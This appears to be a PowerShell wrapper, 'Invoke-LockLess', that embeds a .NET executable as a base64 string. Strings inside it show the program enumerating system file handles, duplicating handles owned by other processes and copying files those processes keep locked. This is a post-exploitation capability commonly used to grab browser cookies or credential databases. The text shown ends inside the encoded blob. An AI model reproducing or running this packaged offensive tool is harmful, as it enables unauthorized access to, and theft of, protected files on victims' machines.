function Invoke-LockLess([string]$Command)
{
$Message="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LgBrAMgELgBzANUEQAB7AKkCQQB7AKkCYAB7AKkCIwGDAKkCQwGDAKkCowGDAKkCwwGDAKkCLwD+AjsA/gJPAAADGgCCAJsAuAAOAXUBowH9ARwCAwABAAAAPQg0BAAACQ44BAIAAgADAAIAAwAFAIYIeQgsADMAQgDVAOcA+QCQAc0B7gFKAkABFwBGDgEAAAEZAA8KAQBAARsAHwMCAEABHQDZDQIAQAEfAOUNAgBAASEAKwMCAAABIwCDAgIARgElAF4HAgBAAScAxwMCAEABKQDVAwIARgErAKQDAgASAS0AvQMCAAABLwDxDgIAAAExAIgEAgAAATMArwsCAASAAAABAAAAAAAAAAAAAAAAAG8NAAAEAAAAAAAAAAAAAABfArkBAAAAAAQAAAAAAAAAAAAAAF8CsAgAAAAAAAAASUVudW1lcmFibGVgMQBJRW51bWVyYXRvcmAxAExpc3RgMQBLZXJuZWwzMgBVSW50MzIAUmVhZEludDMyAEtleVZhbHVlUGFpcmAyAERpY3Rpb25hcnlgMgBSZWFkSW50NjQAVG9JbnQ2NAA8TW9kdWxlPgBGaWxlSGFuZGxlSUQAZmlsZUhhbmRsZUlEAFByb2Nlc3NJRABwcm9jZXNzSUQARFVQTElDQVRFX0NMT1NFX1NPVVJDRQBJTlZBTElEX0hBTkRMRQBVTklDT0RFX1NUUklORwBTVEFUVVNfSU5GT19MRU5HVEhfTUlTTUFUQ0gAU1lTVEVNX0hBTkRMRV9JTkZPUk1BVElPTgBPQkpFQ1RfTkFNRV9JTkZPUk1BVElPTgBTeXN0ZW0uSU8AU1lTVEVNX0lORk9STUFUSU9OX0NMQVNTAE9CSkVDVF9JTkZPUk1BVElPTl9DTEFTUwBEVVBMSUNBVEVfU0FNRV9BQ0NFU1MAU1RBVFVTX1NVQ0NFU1MATlRfU1RBVFVTAFNUQVRVU19CVUZGRVJfT1ZFUkZMT1cAdmFsdWVfXwBTZXRRdW90YQBtc2NvcmxpYgBTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYwBnZXRfSWQAUHJvY2Vzc0lkAHByb2Nlc3NJZABQYWdlRXhlY3V0ZVJlYWQARmlsZU1hcFJlYWQAVmlydHVhbE1lbW9yeVJlYWQAQ3JlYXRlVGhyZWFkAEFkZABscE92ZXJsYXBwZWQAdGFyZ2V0UGlkADxQYXJzZWRPaz5rX19CYWNraW5nRmllbGQAPEFyZ3VtZW50cz5rX19CYWNraW5nRmllbGQAUXVlcnlEb3NEZXZpY2UAU2hhcmVNb2RlAFNlY3Rpb25JbWFnZQBVc2FnZQBBZGRSYW5nZQBTZWN0aW9uTm9DYWNoZQBJRGlzcG9zYWJsZQBoU291cmNlSGFuZGxlAEZpbmRGaWxlSGFuZGxlAFByb2Nlc3NGaWxlSGFuZGxlAGZpbGVIYW5kbGUAUnVudGltZVR5cGVIYW5kbGUAQ2xvc2VIYW5kbGUARHVwbGljYXRlSGFuZGxlAEdldFR5cGVGcm9tSGFuZGxlAGhTb3VyY2VQcm9jZXNzSGFuZGxlAGhUYXJnZXRQcm9jZXNzSGFuZGxlAGxwVGFyZ2V0SGFuZGxlAGJJbmhlcml0SGFuZGxlAENvcHlMb2NrZWRGaWxlAENyZWF0ZUZpbGUAaFRlbXBsYXRlRmlsZQBXcml0ZUZpbGUATWFwVmlld09mRmlsZQBVbm1hcFZpZXdPZkZpbGUAaEZpbGUAdGFyZ2V0RmlsZQBDb25zb2xlAE5vcm1hbGl6ZURldmljZU5hbWUAbHBEZXZpY2VOYW1lAGRldmljZU5hbWUAR2V0VGVtcEZpbGVOYW1lAGZpbGVOYW1lAGxwTmFtZQBnZXRfUHJvY2Vzc05hbWUAcHJvY2Vzc05hbWUAR2V0UHJvY2Vzc2VzQnlOYW1lAFdyaXRlTGluZQBQaXBlAEdldEZpbGVUeXBlAFZhbHVlVHlwZQBDb21wYXJlAEZhaWx1cmUAUHRyVG9TdHJ1Y3R1cmUARGlzcG9zZQBQYXJzZQBUZXJtaW5hdGUAUGFnZVJlYWRXcml0ZQBQYWdlRXhlY3V0ZVJlYWRXcml0ZQBuTnVtYmVyT2ZCeXRlc1RvV3JpdGUARmlsZU1hcFdyaXRlAFZpcnR1YWxNZW1vcnlXcml0ZQBSZW1vdGUAQ29tcGlsZXJHZW5lcmF0ZWRBdHRyaWJ1dGUAR3VpZEF0dHJpYnV0ZQBEZWJ1Z2dhYmxlQXR0cmlidXRlAENvbVZpc2libGVBdHRyaWJ1dGUAQXNzZW1ibHlUaXRsZUF0dHJpYnV0ZQBBc3NlbWJseVRyYWRlbWFya0F0dHJpYnV0ZQBUYXJnZXRGcmFtZXdvcmtBdHRyaWJ1dGUAQXNzZW1ibHlGaWxlVmVyc2lvbkF0dHJpYnV0ZQBBc3NlbWJseUNvbmZpZ3VyYXRpb25BdHRyaWJ1dGUAQXNzZW1ibHlEZXNjcmlwdGlvbkF0dHJpYnV0ZQBGbGFnc0F0dHJpYnV0ZQBDb21waWxhdGlvblJlbGF4YXRpb25zQXR0cmlidXRlAEFzc2VtYmx5UHJvZHVjdEF0dHJpYnV0ZQBBc3NlbWJseUNvcHlyaWdodEF0dHJpYnV0ZQBBc3NlbWJseUNvbXBhbnlBdHRyaWJ1dGUAUnVudGltZUNvbXBhdGliaWxpdHlBdHRyaWJ1dGUARmlsZU1hcEV4ZWN1dGUAZ2V0X1ZhbHVlAEhhbmRsZVZhbHVlAFRyeUdldFZhbHVlAFNlY3Rpb25SZXNlcnZlAExvY2tMZXNzLmV4ZQBnZXRfU2l6ZQBscEZpbGVTaXplAFN5bmNocm9uaXplAFNpemVPZgBMYXN0SW5kZXhPZgBTeXN0ZW0uUnVudGltZS5WZXJzaW9uaW5nAENyZWF0ZUZpbGVNYXBwaW5nAFRvU3RyaW5nAFN1YnN0cmluZwBkd01heGltdW1TaXplSGlnaABkd0ZpbGVPZmZzZXRIaWdoAE1hdGgAbHBUYXJnZXRQYXRoAGdldF9MZW5ndGgATWF4aW11bUxlbmd0aABTeXN0ZW1JbmZvcm1hdGlvbkxlbmd0aABPYmplY3RJbmZvcm1hdGlvbkxlbmd0aABSZXR1cm5MZW5ndGgARW5kc1dpdGgAUHRyVG9TdHJpbmdVbmkAU3RyaW5nVG9IR2xvYmFsVW5pAGdldF9QYXJzZWRPawBwYXJzZWRPawBEaXNrAEFsbG9jSEdsb2JhbABGcmVlSEdsb2JhbABNYXJzaGFsAEFsbABrZXJuZWwzMi5kbGwAbnRkbGwuZGxsAE50ZGxsAFByb2dyYW0AZ2V0X0l0ZW0Ac2V0X0l0ZW0AU3lzdGVtAFRyaW0ARW51bQBscE51bWJlck9mQnl0ZXNXcml0dGVuAE1haW4AT2JqZWN0RGF0YUluZm9ybWF0aW9uAFN5c3RlbVJlZ2lzdHJ5UXVvdGFJbmZvcm1hdGlvbgBTeXN0ZW1CYXNpY0luZm9ybWF0aW9uAE9iamVjdEJhc2ljSW5mb3JtYXRpb24AUXVlcnlMaW1pdGVkSW5mb3JtYXRpb24AU3lzdGVtUGVyZm9ybWFuY2VJbmZvcm1hdGlvbgBTeXN0ZW1Qcm9jZXNzb3JQZXJmb3JtYW5jZUluZm9ybWF0aW9uAFN5c3RlbUxvb2thc2lkZUluZm9ybWF0aW9uAFN5c3RlbUhhbmRsZUluZm9ybWF0aW9uAE9iamVjdE5hbWVJbmZvcm1hdGlvbgBPYmplY3RUeXBlSW5mb3JtYXRpb24AT2JqZWN0QWxsSW5mb3JtYXRpb24ATnRRdWVyeVN5c3RlbUluZm9ybWF0aW9uAFN5c3RlbUV4Y2VwdGlvbkluZm9ybWF0aW9uAFN5c3RlbVByb2Nlc3NJbmZvcm1hdGlvbgBPYmplY3RJbmZvcm1hdGlvbgBTZXRJbmZvcm1hdGlvbgBTeXN0ZW1JbnRlcnJ1cHRJbmZvcm1hdGlvbgBTeXN0ZW1UaW1lT2ZEYXlJbmZvcm1hdGlvbgBRdWVyeUluZm9ybWF0aW9uAFZpcnR1YWxNZW1vcnlPcGVyYXRpb24AU3lzdGVtLlJlZmxlY3Rpb24ARmlsZU1hcFByb3RlY3Rpb24AQ3JlYXRpb25EaXNwb3NpdGlvbgBFeGNlcHRpb24AU3RyaW5nQ29tcGFyaXNvbgBVbmtub3duAGNvcHlUbwBaZXJvAEJ1aWxkRGV2aWNlTWFwAGR3TnVtYmVyT2ZCeXRlc1RvTWFwAENoYXIAT2JqZWN0VHlwZU51bWJlcgBTdHJpbmdCdWlsZGVyAGJ1ZmZlcgBBcmd1bWVudFBhcnNlcgBPYmplY3RfUG9pbnRlcgBHZXRMYXN0RXJyb3IASUVudW1lcmF0b3IAR2V0RW51bWVyYXRvcgAuY3RvcgBJbnRQdHIAU3lzdGVtLkRpYWdub3N0aWNzAFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcwBTeXN0ZW0uUnVudGltZS5Db21waWxlclNlcnZpY2VzAERlYnVnZ2luZ01vZGVzAEdldEFsbEZpbGVIYW5kbGVzAEdldEhhbmRsZU5hbWVzAGNhbmRpZGF0ZVByb2Nlc3NlcwBHZXRQcm9jZXNzZXMARmxhZ3NBbmRBdHRyaWJ1dGVzAGxwRmlsZU1hcHBpbmdBdHRyaWJ1dGVzAFNlY3VyaXR5QXR0cmlidXRlcwBHZXRMb2dpY2FsRHJpdmVzAFByb2Nlc3NBY2Nlc3NGbGFncwBhcmdzAGRldmljZVBhdGhzAENvbnZlcnREZXZpY2VQYXRoc1RvRG9zUGF0aHMAU3lzdGVtLkNvbGxlY3Rpb25zAER1cGxpY2F0ZU9wdGlvbnMAb3B0aW9ucwBTeXN0ZW1JbmZvcm1hdGlvbkNsYXNzAE9iamVjdEluZm9ybWF0aW9uQ2xhc3MATG9ja0xlc3MAZHdEZXNpcmVkQWNjZXNzAEdyYW50ZWRBY2Nlc3MARmlsZU1hcEFsbEFjY2VzcwBGaWxlTWFwQWNjZXNzAHByb2Nlc3NBY2Nlc3MAU3VjY2VzcwBDcmVhdGVQcm9jZXNzAE9wZW5Qcm9jZXNzAEdldEN1cnJlbnRQcm9jZXNzAGxwQmFzZUFkZHJlc3MAZ2V0X0FyZ3VtZW50cwBhcmd1bWVudHMAQ29uY2F0AEZvcm1hdABoRmlsZU1hcHBpbmdPYmplY3QAaE9iamVjdABOdFF1ZXJ5T2JqZWN0AGZsUHJvdGVjdABvcF9FeHBsaWNpdABTcGxpdABTZWN0aW9uQ29tbWl0AEFyZ3VtZW50UGFyc2VyUmVzdWx0AEVudmlyb25tZW50AGdldF9DdXJyZW50AGdldF9IYW5kbGVDb3VudABNb3ZlTmV4dABTeXN0ZW0uVGV4dABkd01heGltdW1TaXplTG93AGR3RmlsZU9mZnNldExvdwBHZXRGaWxlU2l6ZUV4AHVjY2hNYXgAZ2V0X0tleQBDb250YWluc0tleQBQYWdlUmVhZG9ubHkAUGFnZVdyaXRlQ29weQBGaWxlTWFwQ29weQBvcF9FcXVhbGl0eQBvcF9JbmVxdWFsaXR5AElzTnVsbE9yRW1wdHkAAAAAM1wARABlAHYAaQBjAGUAXABMAGEAbgBtAGEAbgBSAGUAZABpAHIAZQBjAHQAbwByAFwAAANcAABbRgBhAGkAbABlAGQAIAB0AG8AIAByAGUAdAByAGkAZQB2AGUAIABzAHkAcwB0AGUAbQAgAGgAYQBuAGQAbABlACAAaQBuAGYAbwByAG0AYQB0AGkAbwBuAC4AACFbACoAXQAgAEMAbwBwAHkAaQBuAGcAIAB0AG8AOgAgAABRWwAqAF0AIABDAG8AcABpAGUAZAAgAHsAMAB9ACAAYgB5AHQAZQBzACAAZgByAG8AbQAgACIAewAxAH0AIgAgAHQAbwAgACIAewAyAH0AIgAAgL8NAAoAIAAgAEwAbwBjAGsATABlAHMAcwAuAGUAeABlACAAPABmAGkAbABlAC4AZQB4AHQAIAB8ACAAYQBsAGwAPgAgAFsALwBwAHIAbwBjAGUAcwBzADoATgBBAE0ARQAxACwATgBBAE0ARQAyACwALgAuAC4AXQAgAFsALwBjAG8AcAB5ACAAfAAgAC8AYwBvAHAAeQA6AEMAOgBcAFQAZQBtAHAAXABmAGkAbABlAC4AZQB4AHQAXQANAAoAAAEABS8AaAAABS8ASAAABS8APwAACy8AaABlAGwAcAAACy8ASABFAEwAUAAABS0AaAABBS0ASAABBS0APwABCy0AaABlAGwAcAABCy0ASABFAEwAUAABES8AcAByAG8AYwBlAHMAcwAACy8AYwBvAHAAeQAAB2EAbABsAABXUAByAG8AYwBlAHMAcwBOAGEAbQBlACwAUAByAG8AYwBlAHMAcwBJAEQALABGAGkAbABlAEgAYQBuAGQAbABlAEkARAAsAEYAaQBsAGUATgBhAG0AZQAAH3sAMAB9ACwAewAxAH0ALAB7ADIAfQAsAHsAMwB9AABjDQAKAFsAKgBdACAAUwBlAGEAcgBjAGgAaQBuAGcAIABwAHIAbwBjAGUAcwBzAGUAcwAgAGYAbwByACAAYQBuACAAbwBwAGUAbgAgAGgAYQBuAGQAbABlACAAdABvACAAIgAAAyIAAHdbACsAXQAgAFAAcgBvAGMAZQBzAHMAIAAiAHsAMAB9ACIAIAAoAHsAMQB9ACkAIABoAGEAcwAgAGEAIABmAGkAbABlACAAaABhAG4AZABsAGUAIAAoAEkARAAgAHsAMgB9ACkAIAB0AG8AIAAiAHsAMwB9ACIAADVbAFgAXQAgAEgAYQBuAGQAbABlACAAbgBvAHQAIABmAG8AdQBuAGQAIABmAG8AcgAgACIAADvi57NuawpOmeT0azcxDEsABCABAQgDIAABBSABARERBCABAQ4EIAEBAhEHBRUSSQIODhUSTQEODggSDAYVEkkCDg4FFRJFAQ4IIAAVEk0BEwAFFRJNAQ4EIAATAAQgAQgDBSACDggIBCABDggHIAIBEwATAQIGDgMgAAIDIAAIBAABGA4EAAEBGAIGGAQAAQ4YDwcGDhUSSQIODhJpHQ4IDgQAAB0OAyAADgQHAg4OCwAGCA4IDggIEYCVBSACCAMIBQACDg4OHAcGFRJJAggOFRFtAggOFRFxAggOFRJJAg4OCA4GFRJJAggOCiAAFRFtAhMAEwEGFRFtAggOCiAAFRFxAhMA